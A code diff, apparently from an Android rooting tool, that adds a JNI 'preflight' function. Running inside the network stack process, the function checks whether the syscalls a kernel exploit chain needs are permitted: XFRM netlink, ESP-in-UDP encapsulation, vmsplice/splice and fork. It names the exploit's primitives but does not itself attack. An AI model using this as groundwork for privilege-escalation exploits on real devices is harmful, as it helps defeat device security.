@@ -1418,6 +1418,179 @@ Java_org_lsposed_lspromise_DirtyFrag_patchCxx(JNIEnv *env, jclass clazz) {
     return 0;
 }
 
+
+/*
+ * Non-destructive remote preflight.
+ *
+ * This runs inside com.android.networkstack.process immediately before the
+ * point-of-no-return transaction. It exercises only the syscall families and
+ * per-socket setup the DirtyFrag path needs. It deliberately does NOT send
+ * XFRM_MSG_NEWSA/DELSA, touch a target file, execute crash_dump64, load a
+ * module, alter SELinux state, or create any /dev/df marker.
+ *
+ * Return 0 only when every probe succeeds. The bitmask is diagnostic only; the
+ * coordinator treats every non-zero result as a hard refusal before runAll().
+ */
+static int dfr_remote_preflight(struct Reporter *reporter) {
+    unsigned failures = 0;
+
+    /* NETLINK_XFRM socket + bind: exercises socket()/bind() under seccomp. */
+    errno = 0;
+    int xfrm = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
+    if (xfrm < 0) {
+        failures |= 1u << 0;
+        REPORTLN("[DFR][PREFLIGHT] NETLINK_XFRM=FAIL errno=%d (%s)",
+                 errno, strerror(errno));
+    } else {
+        struct sockaddr_nl nl;
+        memset(&nl, 0, sizeof(nl));
+        nl.nl_family = AF_NETLINK;
+        errno = 0;
+        if (bind(xfrm, (struct sockaddr *)&nl, sizeof(nl)) != 0) {
+            failures |= 1u << 0;
+            REPORTLN("[DFR][PREFLIGHT] NETLINK_XFRM_BIND=FAIL errno=%d (%s)",
+                     errno, strerror(errno));
+        } else {
+            REPORTLN("[DFR][PREFLIGHT] NETLINK_XFRM=PASS");
+        }
+        close(xfrm);
+    }
+
+    /*
+     * UDP encapsulation option used by the exploit. The socket is ephemeral and
+     * never sends a datagram, so this tests policy/capability without affecting
+     * another socket or the XFRM state table.
+     */
+    errno = 0;
+    int udp = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+    if (udp < 0) {
+        failures |= 1u << 1;
+        REPORTLN("[DFR][PREFLIGHT] UDP_SOCKET=FAIL errno=%d (%s)",
+                 errno, strerror(errno));
+    } else {
+        struct sockaddr_in sa;
+        memset(&sa, 0, sizeof(sa));
+        sa.sin_family = AF_INET;
+        sa.sin_port = 0;
+        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        int encap = UDP_ENCAP_ESPINUDP;
+        errno = 0;
+        if (bind(udp, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
+            failures |= 1u << 1;
+            REPORTLN("[DFR][PREFLIGHT] UDP_BIND=FAIL errno=%d (%s)",
+                     errno, strerror(errno));
+        } else if (setsockopt(udp, IPPROTO_UDP, UDP_ENCAP,
+                              &encap, sizeof(encap)) != 0) {
+            failures |= 1u << 1;
+            REPORTLN("[DFR][PREFLIGHT] UDP_ENCAP=FAIL errno=%d (%s)",
+                     errno, strerror(errno));
+        } else {
+            REPORTLN("[DFR][PREFLIGHT] UDP_ENCAP=PASS");
+        }
+        close(udp);
+    }
+
+    /*
+     * mmap + pipe + vmsplice + splice, but the only sink is /dev/null. This
+     * exercises the exact zero-copy syscall family without involving any
+     * page-cache target.
+     */
+    long ps = sysconf(_SC_PAGESIZE);
+    if (ps <= 0) ps = 4096;
+    errno = 0;
+    void *page = mmap(NULL, (size_t)ps, PROT_READ | PROT_WRITE,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (page == MAP_FAILED) {
+        failures |= 1u << 2;
+        REPORTLN("[DFR][PREFLIGHT] MMAP=FAIL errno=%d (%s)",
+                 errno, strerror(errno));
+    } else {
+        ((unsigned char *)page)[0] = 0x5a;
+        int pfd[2] = {-1, -1};
+        int nullfd = -1;
+        errno = 0;
+        if (pipe(pfd) != 0) {
+            failures |= 1u << 2;
+            REPORTLN("[DFR][PREFLIGHT] PIPE=FAIL errno=%d (%s)",
+                     errno, strerror(errno));
+        } else {
+            struct iovec iov = {.iov_base = page, .iov_len = 1};
+            errno = 0;
+            ssize_t n = vmsplice(pfd[1], &iov, 1, 0);
+            if (n != 1) {
+                failures |= 1u << 2;
+                REPORTLN("[DFR][PREFLIGHT] VMSPLICE=FAIL rc=%zd errno=%d (%s)",
+                         n, errno, strerror(errno));
+            } else {
+                errno = 0;
+                nullfd = open("/dev/null", O_WRONLY | O_CLOEXEC);
+                if (nullfd < 0) {
+                    failures |= 1u << 2;
+                    REPORTLN("[DFR][PREFLIGHT] DEVNULL=FAIL errno=%d (%s)",
+                             errno, strerror(errno));
+                } else {
+                    errno = 0;
+                    n = splice(pfd[0], NULL, nullfd, NULL, 1, 0);
+                    if (n != 1) {
+                        failures |= 1u << 2;
+                        REPORTLN("[DFR][PREFLIGHT] SPLICE=FAIL rc=%zd errno=%d (%s)",
+                                 n, errno, strerror(errno));
+                    } else {
+                        REPORTLN("[DFR][PREFLIGHT] MMAP_PIPE_VMSPLICE_SPLICE=PASS");
+                    }
+                }
+            }
+        }
+        if (nullfd >= 0) close(nullfd);
+        if (pfd[0] >= 0) close(pfd[0]);
+        if (pfd[1] >= 0) close(pfd[1]);
+        munmap(page, (size_t)ps);
+    }
+
+    /*
+     * Process creation/wait, with an immediate _exit child and no exec. This is
+     * sufficient to expose a seccomp denial of the process-creation syscall
+     * family while keeping the preflight free of helper execution.
+     */
+    errno = 0;
+    pid_t child = fork();
+    if (child < 0) {
+        failures |= 1u << 3;
+        REPORTLN("[DFR][PREFLIGHT] FORK=FAIL errno=%d (%s)",
+                 errno, strerror(errno));
+    } else if (child == 0) {
+        _exit(0);
+    } else {
+        int status = 0;
+        errno = 0;
+        if (TEMP_FAILURE_RETRY(waitpid(child, &status, 0)) < 0 ||
+            !WIFEXITED(status) || WEXITSTATUS(status) != 0) {
+            failures |= 1u << 3;
+            REPORTLN("[DFR][PREFLIGHT] FORK_WAIT=FAIL status=0x%x errno=%d (%s)",
+                     status, errno, strerror(errno));
+        } else {
+            REPORTLN("[DFR][PREFLIGHT] FORK_WAIT=PASS");
+        }
+    }
+
+    if (failures == 0) {
+        REPORTLN("[DFR][PREFLIGHT] PASS all non-destructive syscall probes");
+        return 0;
+    }
+
+    REPORTLN("[DFR][PREFLIGHT] FAIL mask=0x%x; refusing before runAll", failures);
+    return (int)failures;
+}
+
+JNIEXPORT jint JNICALL
+Java_org_lsposed_lspromise_DirtyFrag_preflight(JNIEnv *env, jobject thiz) {
+    struct Reporter reporterobj = {
+        .env = env,
+        .obj = thiz
+    };
+    return dfr_remote_preflight(&reporterobj);
+}
+
 static int createOrphanProcess() {
 
     int pid = fork();
